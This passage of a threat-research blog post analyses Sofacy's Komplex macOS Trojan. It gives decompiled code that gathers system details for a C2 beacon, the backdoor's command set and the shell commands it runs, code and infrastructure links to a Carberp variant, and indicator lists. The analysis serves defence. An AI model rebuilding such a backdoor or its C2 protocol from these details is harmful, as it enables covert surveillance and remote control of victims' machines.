class="crayon-h"> </span><span class="crayon-i">operatingSystemVersionString</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f53365093162-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_20</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">NSUserName</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f53365093162-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_28</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">InfoOS</span><span class="crayon-sy">:</span><span class="crayon-sy">:</span><span class="crayon-e">getProcessList</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f53365093162-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">var_30</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-e">operator </span><span class="crayon-r">new</span><span class="crayon-sy">[</span><span class="crayon-sy">]</span><span class="crayon-sy">(</span><span class="crayon-e">strlen</span><span class="crayon-sy">(</span><span class="crayon-i">var_28</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>+<span class="crayon-h"> </span><span class="crayon-cn">0x200</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f53365093162-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">sprintf</span><span class="crayon-sy">(</span><span class="crayon-i">var_30</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"Mac OS X - %s %s\nUser name - %s\n\t\t\t\t\t\tProcess </span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f53365093162-8"><span class="crayon-s">list :\n\n%s"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">var_18 </span><span class="crayon-i">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">InfoOS</span><span class="crayon-sy">:</span><span class="crayon-sy">:</span><span class="crayon-e">bitOS</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-e">var_20 </span><span class="crayon-i">UTF8String</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-67d4f94a16f53365093162-9"><span class="crayon-i">var_28</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f53365093162-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">rax</span><span class="crayon-h"> </span>=<span class="crayon-h"> </span><span class="crayon-i">var_30</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-67d4f94a16f53365093162-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-i">rax</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f53365093162-12"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p></p>
<p style="text-align: center;"><em>Figure </em><em>10</em><em> getOsInfo function within Komplex that gathers system information for C2 beacon</em></p>
<p>The Sofacy C2 server will respond to this HTTP request with encrypted data that the payload will decrypt using the same custom algorithm used to encrypt the POST data. The Komplex payload will parse the C2 response for the following strings: "[file]" and "[/file]", "FileName=", "PathToSave=", "Shell=", "Execute", and "Delete". The "Delete" action does nothing more than delete a file specified by 'PathToSave'/'FileName', whereas the "Execute" action involves running the following system commands before executing the specified file:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-67d4f94a16f56696048986" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
mkdir -p &amp;lt;'PathToSave'&amp;gt; &amp;amp;&amp;gt; /dev/null
chmod 755 &amp;lt;'PathToSave'&amp;gt;/&amp;lt;'FileName'&amp;gt; &amp;amp;&amp;gt; /dev/null</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-67d4f94a16f56696048986-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-67d4f94a16f56696048986-2">2</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-67d4f94a16f56696048986-1"><span class="crayon-i">mkdir</span><span class="crayon-h"> </span>-<span class="crayon-i">p</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;lt;</span><span class="crayon-s">'PathToSave'</span><span class="crayon-sy">&amp;gt;</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;amp;</span><span class="crayon-sy">&amp;gt;</span><span class="crayon-h"> </span>/<span class="crayon-i">dev</span>/<span class="crayon-t">null</span></div><div class="crayon-line crayon-striped-line" id="crayon-67d4f94a16f56696048986-2"><span class="crayon-i">chmod</span><span class="crayon-h"> </span><span class="crayon-cn">755</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;lt;</span><span class="crayon-s">'PathToSave'</span><span class="crayon-sy">&amp;gt;</span>/<span class="crayon-sy">&amp;lt;</span><span class="crayon-s">'FileName'</span><span class="crayon-sy">&amp;gt;</span><span class="crayon-h"> </span><span class="crayon-sy">&amp;amp;</span><span class="crayon-sy">&amp;gt;</span><span class="crayon-h"> </span>/<span class="crayon-i">dev</span>/<span class="crayon-t">null</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0001 seconds] -->
<p>The payload will treat "[file]" and "[/file]" as delimiters that specify the data that the payload should write to a specified file, which allows the threat actor to download additional files to the system. Lastly, the payload can execute commands on the compromised system specified within the "Shell" field, which the payload will execute and then send results back to the C2.</p>
<h3>Connections to Sofacy and Previous Attacks.</h3>
<p><strong>Code Overlaps</strong></p>
<p>While reverse engineering the Komplex payload, we came across a few code overlaps that we believed were worth exploring. First, we noticed striking similarities between the Komplex payload and the traits and behavior of an OS X Trojan discussed in a BAE Systems blog titled <a href="https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html" target="_blank">NEW MAC OS MALWARE EXPLOITS MACKEEPER.</a> According to this blog post, an OS X Trojan was delivered via a vulnerability in the MacKeeper application. The nameless OS X Trojan uses an 11-byte XOR algorithm to decrypt an embedded configuration, which has all of the same variable names and values as the Komplex sample (see Table 1). The algorithm used to encrypt and decrypt the network traffic, as well as all static elements of the network communications (composition of URL, structure of HTTP data, command parsing procedure, etc.) discussed in the blog post are the exact same as seen in the Komplex payload. These overlaps suggest that the Trojan delivered by the MacKeeper vulnerability was in fact the Komplex Trojan.</p>
<p>The second code overlap ties the Komplex Trojan to Sofacy’s Carberp variant, which we have analyzed in <a href="https://blog.paloaltonetworks.com/2016/06/unit42-new-sofacy-attacks-against-us-government-agency/" target="_blank">previous research efforts</a>. Even though Komplex was created to run on OS X and Sofacy’s Carberp variant was developed to run on Windows, they share many commonalities, including:</p>
<ul>
<li>Same URL generation logic using random path values, a random file extension and encrypted token</li>
<li>Same file extensions used in C2 URL that are listed within the binaries in the same order</li>
<li>Same algorithm used to encrypt and decrypt the token in the URL and HTTP POST data (Carberp key is modified using value 0xAA7D756 whereas Komplex uses 0xE150722)</li>
<li>Very similar command handling, including parsing specifically for Execute, Delete, [file], [/file], FileName, and PathToSave.</li>
<li>Checks for Internet connectivity by connecting to google.com</li>
<li>Uses an 11-byte XOR key to decrypt strings within the configuration</li>
</ul>
<p>In addition to these common traits, we found a Sofacy Carberp variant (SHA256: 638e7ca68643d4b01432f0ecaaa0495b805cc3cccc17a753b0fa511d94a22bdd) using the same TOKEN value of ‘h8sn3vq6kl’ within its C2 URL, as observed in Komplex payloads. Based on these observations, we believe that the author of Sofacy’s Carberp variant used the same code, or at least the same design, to create the Komplex Trojan. A benefit of retaining many of the same functionalities within the Windows and OS X Trojans is that it would require fewer alterations to the C2 server application to handle cross-platform implants.</p>
<p><strong>Infrastructure Overlap</strong></p>
<p>While Komplex’s C2 domain appleupdate[.]org does not appear to have any previously known activity associated with it, both the apple-iclouds[.]net and itunes-helper[.]net domains have direct ties to Sofacy activity. The apple-iclouds[.]net domain is mentioned within a <a href="https://pwc.blogs.com/files/tactical-intelligence-bulletin---sofacy-phishing.pdf" target="_blank">PwC Tactical Intelligence Bulletin</a> that discussed a phishing campaign conducted by the Sofacy group. The itunes-helper[.]net domain is associated with separate activity discussed in Trend Micro’s blog titled <a href="https://blog.trendmicro.com/trendlabs-security-intelligence/looking-into-a-cyber-attack-facilitator-in-the-netherlands/" target="_blank">Looking Into a Cyber-Attack Facilitator in the Netherlands</a> that included research on hosting providers used by Pawn Storm (Sofacy).</p>
<p>The domain appleupdate[.]org does have one interesting correlation point, specifically involving the IP 185.10.58[.]170 that resolved this domain between April 2015 through April 2016. Researchers at BAE Systems provided Unit 42 the Komplex payload delivered through the exploitation of MacKeeper (Dropper SHA256: da43d39c749c121e99bba00ce809ca63794df3f704e7ad4077094abde4cf2a73 and Payload SHA256: 45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54), which used the IP address 185.10.58[.]170 within its configuration as a C2 server. This infrastructure overlap further strengthens the connection between the Komplex payload we discovered with the prior campaign using MacKeeper for delivery.</p>
<h3>Conclusion</h3>
<p>The Sofacy group created the Komplex Trojan to use in attack campaigns targeting the OS X operating system – a move that showcases their continued evolution toward multi-platform attacks. The tool is capable of downloading additional files to the system, executing and deleting files, as well as directly interacting with the system shell. While detailed targeting information is not currently available, we believe Komplex has been used in attacks on individuals related to the aerospace industry, as well as attacks leveraging an exploit in MacKeeper to deliver the Trojan. The Komplex Trojan revealed a design similar to Sofacy’s Carberp variant Trojan, which we believe may have been done in order to handle compromised Windows and OS X systems using the same C2 server application with relative ease.</p>
<p>While Unit 42 continues to research and track this threat, Palo Alto Networks customers are protected via the following:</p>
<ul>
<li>WildFire correctly identifies known Komplex executables as malicious</li>
<li>IPS signature #14442 Sofacy.Gen Command And Control Traffic can detect and block outbound C2 requests generated by the Komplex Trojan.</li>
<li>Customers can track this Trojan via the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Komplex" target="_blank">Komplex</a> tag in AutoFocus.</li>
</ul>
<h3>IOCs:</h3>
<p><strong>Hashes:<br />
</strong>2a06f142d87bd9b66621a30088683d6fcec019ba5cc9e5793e54f8d920ab0134<br />
c1b8fc00d815e777e39f34a520342d1942ebd29695c9453951a988c61875bcd7<br />
cffa1d9fc336a1ad89af90443b15c98b71e679aeb03b3a68a5e9c3e7ecabc3d4<br />
96a19a90caa41406b632a2046f3a39b5579fbf730aca2357f84bf23f2cbc1fd3<br />
227b7fe495ad9951aebf0aae3c317c1ac526cdd255953f111341b0b11be3bbc5<br />
45a93e4b9ae5bece0d53a3a9a83186b8975953344d4dfb340e9de0015a247c54</p>
<p><strong>C2 Locations:<br />
</strong>appleupdate[.]org<br />
apple-iclouds[.]net<br />
itunes-helper[.]net<br />
185.10.58.170</p>
      
              </div>
              <!--<span class="post__date">Updated 1 November, 2018 at 12:23 PM PDT</span>-->
              <button class="l-btn back-to-top" id="backToTop" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:back to top">Back to top</button>
              
			<div class="be__tags-wrapper"> 
				<h3>Tags</h3><ul role="list"><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/aerospace/" role="link" title="aerospace" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:tags:aerospace">Aerospace</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/fighting-ursa/" role="link" title="Fighting Ursa" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:tags:Fighting Ursa">Fighting Ursa</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/komplex/" role="link" title="Komplex" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:tags:Komplex">Komplex</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/os-x/" role="link" title="OS X" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:tags:OS X">OS X</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/sofacy/" role="link" title="Sofacy" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:tags:Sofacy">Sofacy</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/trojan/" role="link" title="Trojan" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:tags:Trojan">Trojan</a></li></ul>
			</div> 
              <div class="be__post-nav">
    <a class="prev" href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:article-nav:Threat Research Center"> 
        <span>Threat Research Center</span>
    </a>
            <a class="next" href="https://unit42.paloaltonetworks.com/unit42-palo-alto-networks-researcher-discovers-eight-critical-vulnerabilities-in-adobe-flash-player/" role="link" title="Palo Alto Networks Researcher Discovers Eight Critical Vulnerabilities in Adobe Flash Player" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:article-nav:Palo Alto Networks Researcher Discovers Eight Critical Vulnerabilities in Adobe Flash Player"> 
            <span>Next: Palo Alto Networks Researcher Discovers Eight Critical Vulnerabilities in Adobe Flash Player</span>
        </a>
    </div>
 
            </div>
            <div class="be__nav">
            <div class="be__nav-wrapper">
   
        <div class="be-related-articles">
        <h3>Related Articles</h3>
        <ul> 
                        <li>
                  <a href="https://unit42.paloaltonetworks.com/fighting-ursa-car-for-sale-phishing-lure/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:sidebar:related-articles:Fighting Ursa Luring Targets With Car for Sale">
                      Fighting Ursa Luring Targets With Car for Sale                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/threat-actor-groups-tracked-by-palo-alto-networks-unit-42/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:sidebar:related-articles:Threat Actor Groups Tracked by Palo Alto Networks Unit 42">
                      Threat Actor Groups Tracked by Palo Alto Networks Unit 42                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/unit42-threat-intelligence-roundup/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:sidebar:related-articles:From DarkGate to AsyncRAT: Malware Detected and Shared As Unit 42 Timely Threat Intelligence">
                      From DarkGate to AsyncRAT: Malware Detected and Shared As Unit 42 Timely Threat Intelligence                  </a>
              </li>
                      </ul>
      </div>
      </div> 
            </div>
          </div>
        </div>
          <div class="pa related-threat">
    <div class="l-container">
            <h2>Related Malware Resources</h2>
      <div class="blog-slider" id="blogSlider"> 
                    <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/07_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of unusual malware. A glowing pink warning triangle with an exclamation point on a screen with the word &quot;malware.&quot; There are other text elements on the screen suggesting a coding environment. The colors are neon blue and pink." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/07_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/07_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/07_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/07_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/07_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Off the Beaten Path: Recent Unusual Malware:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-03-14T10:00:04+00:00">March 14, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/unusual-malware/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Off the Beaten Path: Recent Unusual Malware">
                    <h4 class="post-title">Off the Beaten Path: Recent Unusual Malware</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/net/" title=".NET" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Off the Beaten Path: Recent Unusual Malware:.NET">.NET</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/backdoor/" title="backdoor" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Off the Beaten Path: Recent Unusual Malware:backdoor">Backdoor</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/c/" title="C++" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Off the Beaten Path: Recent Unusual Malware:C++">C++</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/unusual-malware/" title="Off the Beaten Path: Recent Unusual Malware" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Off the Beaten Path: Recent Unusual Malware:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/03_Cybercrime_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of scam crypto investment platforms. A digital image featuring glowing numerical data and key cybersecurity terms like &quot;Crime,&quot; &quot;Hackers,&quot; and &quot;Security&quot; highlighted across a dark, abstract background." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/03_Cybercrime_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/03_Cybercrime_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/03_Cybercrime_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/03_Cybercrime_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/03/03_Cybercrime_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-03-13T10:00:21+00:00">March 13, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/fraud-crypto-platforms-campaign/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims">
                    <h4 class="post-title">Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/scams/" title="Scams" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims:Scams">Scams</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/phishing/" title="phishing" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims:phishing">Phishing</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/cryptocurrency/" title="Cryptocurrency" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims:Cryptocurrency">Cryptocurrency</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/fraud-crypto-platforms-campaign/" title="Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Investigating Scam Crypto Investment Platforms Using Pyramid Schemes to Defraud Victims:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/06_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of popular malware families like Agent Tesla, XWorm and FormBook/XLoader. A blurred image of a person in a dynamic coding environment, with visible code on screens and colorful lighting predominantly in blue and pink tones. The scene suggests an intense focus on technology and software development." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/06_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/06_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/06_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/06_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/06_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Uncovering .NET Malware Obfuscated by Encryption and Virtualization:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-03-03T11:00:19+00:00">March 3, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/malware-obfuscation-techniques/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Uncovering .NET Malware Obfuscated by Encryption and Virtualization">
                    <h4 class="post-title">Uncovering .NET Malware Obfuscated by Encryption and Virtualization</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/net/" title=".NET" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Uncovering .NET Malware Obfuscated by Encryption and Virtualization:.NET">.NET</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/agenttesla/" title="AgentTesla" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Uncovering .NET Malware Obfuscated by Encryption and Virtualization:AgentTesla">AgentTesla</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/anti-analysis/" title="anti-analysis" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Uncovering .NET Malware Obfuscated by Encryption and Virtualization:anti-analysis">Anti-analysis</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/malware-obfuscation-techniques/" title="Uncovering .NET Malware Obfuscated by Encryption and Virtualization" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Uncovering .NET Malware Obfuscated by Encryption and Virtualization:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/11_Nation-State-cyberattacks_1920x900-10.56.58 AM-786x368.jpg" class="lozad" alt="A pictorial representation of Squidoor. A vivid display of multiple monitors showing graphics and text related to a cyber attack, featuring skull symbols and digital distortions." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/11_Nation-State-cyberattacks_1920x900-10.56.58 AM-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/11_Nation-State-cyberattacks_1920x900-10.56.58 AM-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/11_Nation-State-cyberattacks_1920x900-10.56.58 AM-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/11_Nation-State-cyberattacks_1920x900-10.56.58 AM-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2025/02/11_Nation-State-cyberattacks_1920x900-10.56.58 AM.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2025-02-27T11:00:15+00:00">February 27, 2025</time></span>
                  <a href="https://unit42.paloaltonetworks.com/advanced-backdoor-squidoor/" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations">
                    <h4 class="post-title">Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/backdoor/" title="backdoor" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations:backdoor">Backdoor</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/web-shells/" title="web shells" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations:web shells">Web shells</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/china/" title="China" role="link" data-page-track="true" data-page-track-value="unit42-sofacys-komplex-os-x-trojan:related-resources:Squidoor: Suspected Chinese Threat Actor’s Backdoor Targets Global Organizations:China">China</a>
